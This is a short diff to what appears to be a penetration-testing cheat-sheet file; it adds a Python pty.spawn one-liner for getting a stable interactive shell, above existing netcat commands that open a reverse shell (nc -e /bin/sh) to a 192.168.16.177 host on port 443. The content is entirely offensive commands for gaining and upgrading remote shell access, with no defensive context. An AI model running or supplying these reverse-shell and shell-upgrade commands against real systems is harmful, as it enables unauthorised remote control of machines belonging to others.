@@ -1,3 +1,7 @@
+Get a stable shell (resolves "sudo: no tty present and no askpass program specified"):
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
 /usr/bin/nc -e /bin/sh 192.168.16.177 443
 
 /netcat -e /bin/sh 192.168.16.177 443
